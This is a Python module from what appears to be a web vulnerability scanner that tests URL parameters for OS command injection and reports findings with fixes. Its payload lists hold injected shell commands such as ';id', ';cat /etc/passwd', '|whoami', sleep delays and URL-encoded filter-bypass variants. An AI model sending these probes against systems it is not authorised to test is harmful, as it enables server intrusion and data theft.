"""
OS Command Injection Detection Module (v1.4.0)
Covers: Unix/Windows command injection via URL parameters.
Techniques: error-based, time-based blind, OOB signals.

How attackers use this:
  Attackers inject shell metacharacters (;, |, &&, `) into parameters
  that get passed to OS commands (e.g., ping, nslookup, system()). 
  This can lead to full server compromise, data theft, and reverse shells.

Real-world examples:
  - Shellshock (CVE-2014-6271): bash function injection via HTTP headers
  - Spring4Shell derivatives, CGI-based apps
  - "Convert" / "resize" endpoints that pipe user input to ImageMagick
"""

from __future__ import annotations
import time
import re
from typing import List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

# ─── Error-Based Probes ───────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    # Unix — id command
    (";id",             ["uid=", "gid=", "groups="]),
    ("|id",             ["uid=", "gid=", "groups="]),
    ("&&id",            ["uid=", "gid=", "groups="]),
    ("`id`",            ["uid=", "gid=", "groups="]),
    # Unix — passwd
    (";cat /etc/passwd",  ["root:x:", "daemon:", "/bin/bash"]),
    ("|cat /etc/passwd",  ["root:x:", "daemon:", "/bin/bash"]),
    # Echo-based (works on apps that echo input in shell context)
    (";echo webshield_rce_confirmed",   ["webshield_rce_confirmed"]),
    ("|echo webshield_rce_confirmed",   ["webshield_rce_confirmed"]),
    ("&&echo webshield_rce_confirmed",  ["webshield_rce_confirmed"]),
    ("`echo webshield_rce_confirmed`",  ["webshield_rce_confirmed"]),
    ("$(echo webshield_rce_confirmed)", ["webshield_rce_confirmed"]),
    # Ping param injection (apps that call ping)
    (";id #",           ["uid=", "gid="]),
    ("127.0.0.1;id",    ["uid=", "gid="]),
    ("127.0.0.1|id",    ["uid=", "gid="]),
    ("127.0.0.1 && id", ["uid=", "gid="]),
    # Windows
    ("|whoami",    ["nt authority", "system32", "\\"]),
    ("&whoami",    ["nt authority", "system32", "\\"]),
    (";ipconfig",  ["windows ip", "ipv4 address", "subnet mask"]),
    # URL-encoded variants (bypass basic filters)
    ("%3Bid",      ["uid=", "gid="]),
    ("%7Cid",      ["uid=", "gid="]),
    ("%3Becho+webshield_rce_confirmed", ["webshield_rce_confirmed"]),
]

# ─── Time-Based Probes ────────────────────────────────────────────────────────

TIME_PAYLOADS = [
    # Unix — sleep-based
    (";sleep 4", 4.0),
    ("|sleep 4", 4.0),
    ("&&sleep 4", 4.0),
    ("`sleep 4`", 4.0),
    ("$(sleep 4)", 4.0),
    # Windows — ping-based delay (~4s for 4 pings)
    ("|ping -n 4 127.0.0.1", 3.5),
    ("&ping -c 4 127.0.0.1", 3.5),
]

SLEEP_THRESHOLD = 3.0


def _build_url(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    params = {k: v[0] if isinstance(v, list) else v
              for k, v in parse_qs(p.query, keep_blank_values=True).items()}
    params[param] = value
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(params), ""))


def _error_scan(client, url: str, params: List[str]) -> Optional[Finding]:
    for param in params[:5]:
        for (payload, signals) in ERROR_PAYLOADS:
            try:
                resp = client.get(_build_url(url, param, payload))
                body = resp.text.lower()
            except Exception:
                continue

            hit = next((s for s in signals if s.lower() in body), None)
            if hit:
                return Finding(
                    title=f"OS Command Injection (Error-Based) | param: {param}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Command injection confirmed on parameter '{param}'. "
                        f"The payload '{payload}' caused the server to execute a system "
                        f"command and return output containing '{hit}'. "
                        "This gives attackers full shell access to the server: "
                        "read files, exfiltrate data, pivot to internal network, install backdoors."
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {payload!r}\n"
                        f"Server output signal: '{hit}'\n"
                        f"Response snippet: {resp.text[:300]}"
                    ),
                    remediation=(
                        "Never pass user input to OS commands. "
                        "Use library functions instead of shell execution. "
                        "If shell calls are unavoidable, use allowlist validation and "
                        "escape arguments with shlex.quote() (Python) or execvp() (C)."
                    ),
                    code_fix=(
                        "# ❌ VULNERABLE:\n"
                        "import subprocess\n"
                        "result = subprocess.run(f'ping {user_input}', shell=True)\n\n"
                        "# ✅ SAFE — never use shell=True with user input:\n"
                        "import subprocess, shlex\n"
                        "# Option 1: use list args (no shell)\n"
                        "result = subprocess.run(['ping', user_input], capture_output=True)\n\n"
                        "# Option 2: allowlist validation\n"
                        "import re\n"
                        "if not re.match(r'^[a-zA-Z0-9._-]+$', user_input):\n"
                        "    raise ValueError('Invalid input')\n\n"
                        "# ✅ Node.js — use execFile, not exec:\n"
                        "const { execFile } = require('child_process');\n"
                        "execFile('ping', [userInput], callback);  // safe: no shell"
                    ),
                    reference="https://owasp.org/www-community/attacks/Command_Injection",
                    cvss=9.8,
                )
    return None


def _time_scan(client, url: str, params: List[str], base_time: float) -> Optional[Finding]:
    for param in params[:3]:
        for (payload, delay) in TIME_PAYLOADS[:5]:
            try:
                t0 = time.monotonic()
                client.get(_build_url(url, param, payload), timeout=delay + 2.0)  # cap per-probe
                elapsed = time.monotonic() - t0
            except Exception:
                continue

            if elapsed >= (delay - 0.5) and elapsed >= (base_time + SLEEP_THRESHOLD):
                return Finding(
                    title=f"OS Command Injection (Time-Based Blind) | param: {param}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Blind OS command injection confirmed via time delay on '{param}'. "
                        f"Payload '{payload}' caused {elapsed:.1f}s delay (baseline: {base_time:.1f}s). "
                        "Even without visible output, attackers can extract data character-by-character "
                        "or establish reverse shells."
                    ),
                    evidence=(
                        f"Parameter: {param}\n"
                        f"Payload: {payload!r}\n"
                        f"Response time: {elapsed:.2f}s (baseline: {base_time:.2f}s)\n"
                        f"Triggered delay: {elapsed - base_time:.2f}s above baseline"
                    ),
                    remediation=(
                        "Never execute OS commands with user input. "
                        "Refactor to use native library calls."
                    ),
                    code_fix=(
                        "# Replace system() / shell execution with safe alternatives:\n"
                        "# Instead of: os.system(f'resize {user_file}')\n"
                        "# Use Pillow:\n"
                        "from PIL import Image\n"
                        "img = Image.open(filepath)\n"
                        "img.thumbnail((800, 800))"
                    ),
                    reference="https://portswigger.net/web-security/os-command-injection",
                    cvss=9.8,
                )
    return None


def scan(url: str, timeout: float = 15.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())

    if not params:
        return []

    with get_client(timeout=min(timeout, 12.0)) as client:
        try:
            t0 = time.monotonic()
            client.get(url)
            base_time = time.monotonic() - t0
        except Exception:
            return []

        result = _error_scan(client, url, params)
        if result:
            findings.append(result)
            return findings

        result = _time_scan(client, url, params, base_time)
        if result:
            findings.append(result)

    return findings
